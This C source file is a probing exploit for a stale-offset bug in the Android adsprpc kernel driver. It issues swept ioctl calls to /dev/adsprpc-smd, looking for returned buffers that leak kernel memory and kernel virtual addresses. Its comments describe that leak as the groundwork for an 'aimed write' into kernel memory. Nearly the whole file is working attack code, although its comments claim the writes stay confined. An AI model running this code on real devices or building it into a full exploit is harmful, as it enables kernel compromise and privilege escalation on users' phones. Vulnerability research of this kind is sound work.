#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

/* Sweep of the adsprpc stale-offset hole (context_build_overlap:702 forgets to clear
 * ->offset on the "fully contained" branch, so get_args:1033 makes the descriptor
 * `args - offset`, which both :1041 copy_from_user (in) and put_args:1083-1086
 * copy_to_user (out) then use).
 *
 * Why a sweep and not one crafted call: the only DSP signature we have measured as
 * accepted from shell is handle 1 / method 0 with in=1,out=1, and it is strict about
 * sizes -- my first containment attempt returned EPERM, which this driver ALSO uses for
 * "the DSP said no" (its VERIFY macro maps every failure to EPERM), so one negative
 * proves nothing about the bug.  We walk (method, in_len, out_len, containment offset)
 * and look for rc>=0 where the out buffer comes back holding bytes we did not write:
 * that is a read of the kernel context buffer and it hands us the absolute `args`, which
 * is what any aimed write needs.
 *
 * Safety: the out buffer's user address is always inside OUR page, and each in-buffer's
 * write target args-offset sits after args has advanced past the preceding buffers, so
 * every copy either stays inside the driver's own context buffer or lands in our memory.
 * No target address is chosen by this program.
 */
typedef struct { void *pv; ssize_t len; } remote_buf_t;
typedef union { remote_buf_t buf; uint32_t h; } remote_arg_t;
#define MAKE_SC(meth, in, out) \
    (((uint32_t)(meth) << 24) | (((uint32_t)(in) & 0xff) << 16) | (((uint32_t)(out) & 0xff) << 8))
#define IOCW(n, sz) (unsigned long)((3u << 30) | ((sz) << 16) | ((unsigned long)'R' << 8) | (n))
struct ioctl_invoke { uint32_t handle; uint32_t sc; remote_arg_t *pra; };
struct ioctl_init { uint32_t flags, pad; uintptr_t file; int32_t filelen, filefd;
                    uintptr_t mem; int32_t memlen, memfd; };

#define PAGE_SZ 0x1000
static int fd;
static unsigned char *A, *B;

static void report(unsigned char *p, size_t n)
{
    size_t i;
    int nz = 0;
    for (i = 0; i + 8 <= n; i += 8) {
        uint64_t v;
        memcpy(&v, p + i, 8);
        if (!v)
            continue;
        nz++;
        if (nz <= 6)
            printf("        +%04zx %016llx%s\n", i, (unsigned long long)v,
                   ((v >> 40) == 0xffffffc0ULL || (v >> 40) == 0xffffff80ULL)
                   ? "   <== KERNEL VA" : "");
    }
    printf("      -> %d nonzero qwords\n", nz);
}

static void try_geom(uint32_t method, ssize_t il, ssize_t ol, size_t out_off)
{
    remote_arg_t pra[2];
    struct ioctl_invoke iv;
    int rc;

    /* A: 0xA5 pattern for the first half, zero for the second half, so a returned
     * buffer full of 0xA5/0 means "the kernel echoed our in data" and anything else
     * means we read pool memory we never touched. */
    /* in data = 0xA5 over its own length only; the out region is CLEARED first so any
     * byte that comes back non-zero is proof the kernel copied from the pool, not an
     * echo of what we just wrote. */
    memset(A, 0, PAGE_SZ);
    memset(A, 0xA5, (size_t)il < PAGE_SZ ? (size_t)il : PAGE_SZ);
    memset(A + out_off, 0, (size_t)ol);
    memset(pra, 0, sizeof pra);
    pra[0].buf.pv = A;
    pra[0].buf.len = il;
    pra[1].buf.pv = A + out_off;
    pra[1].buf.len = ol;
    memset(&iv, 0, sizeof iv);
    iv.handle = 1;
    iv.sc = MAKE_SC(method, 1, 1);
    iv.pra = pra;
    errno = 0;
    rc = ioctl(fd, IOCW(1, sizeof iv), &iv);
    printf("  meth=%u in=0x%zx out=0x%zx out@+0x%zx rc=%d errno=%d %-14s",
           method, (size_t)il, (size_t)ol, out_off, rc, errno,
           rc < 0 ? strerror(errno) : "");
    if (rc >= 0) {
        printf("OK\n");
        report(A + out_off, ol > 0x100 ? 0x100 : (size_t)ol);
    } else {
        printf("\n");
    }
}

int main(void)
{
    static const ssize_t ils[] = { 4, 0x40, 0x100, 0x400, 0x800 };
    static const ssize_t ols[] = { 4, 0x100, 0x200 };
    static const size_t ooff[] = { 0x0, 0x8, 0x10, 0x40, 0x100 };
    struct ioctl_init ini;
    remote_arg_t pra[2];
    struct ioctl_invoke iv;
    uint32_t meth;
    int a, b, c, i;

    setvbuf(stdout, NULL, _IONBF, 0);
    A = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    B = mmap(NULL, 2 * PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (A == MAP_FAILED || B == MAP_FAILED) { perror("mmap"); return 1; }

    fd = open("/dev/adsprpc-smd", O_RDONLY);
    printf("open -> %d\n", fd);
    if (fd < 0)
        return 2;
    ioctl(fd, IOCW(5, 4), (unsigned long)0);
    memset(&ini, 0, sizeof ini);
    i = ioctl(fd, IOCW(6, sizeof ini), &ini);
    printf("INIT rc=%d errno=%d\n", i, i ? errno : 0);

    printf("=== positive control: non-overlapping, the shape known to be accepted ===\n");
    memset(pra, 0, sizeof pra);
    memset(A, 0xA5, PAGE_SZ);
    memset(B + 0x100, 0, 0x100);
    pra[0].buf.pv = A;
    pra[0].buf.len = 4;
    pra[1].buf.pv = B + 0x100;
    pra[1].buf.len = 0x100;
    memset(&iv, 0, sizeof iv);
    iv.handle = 1;
    iv.sc = MAKE_SC(0, 1, 1);
    iv.pra = pra;
    errno = 0;
    i = ioctl(fd, IOCW(1, sizeof iv), &iv);
    printf("  control rc=%d errno=%d (%s)   out content:\n", i, errno, strerror(errno));
    if (i >= 0)
        report(B + 0x100, 0x100);

    printf("=== sweep: out buffer contained inside the in buffer's range ===\n");
    for (meth = 0; meth < 9; meth++)
        for (a = 0; a < (int)(sizeof ils / sizeof ils[0]); a++)
            for (b = 0; b < (int)(sizeof ols / sizeof ols[0]); b++)
                for (c = 0; c < (int)(sizeof ooff / sizeof ooff[0]); c++) {
                    if (ooff[c] + (size_t)ols[b] > PAGE_SZ - 0x10)
                        continue;
                    if ((ssize_t)ooff[c] + ols[b] > ils[a])   /* not contained */
                        continue;
                    try_geom(meth, ils[a], ols[b], ooff[c]);
                }
    close(fd);
    return 0;
}
